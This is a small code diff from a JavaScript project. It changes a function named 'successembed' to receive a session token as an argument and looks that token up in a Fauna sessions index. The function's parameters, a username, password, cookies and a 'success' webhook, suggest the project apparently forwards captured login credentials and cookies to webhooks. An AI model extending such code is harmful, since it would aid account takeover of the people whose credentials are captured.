@@ -360,10 +360,9 @@ async function sendwebhooks(webhook, data) {
     }
 }
 
-async function successembed(rusername, rpassword, cookies, successwebhook) {
+async function successembed(rusername, rpassword, cookies, successwebhook,sessionToken) {
 
-    const sessionToken = req.cookies.Account_Session;
-
+    
     const user_ref_from_session = await client.query(
         q.Map(
             q.Paginate(q.Match(q.Index('sessions_by_token'), sessionToken)),
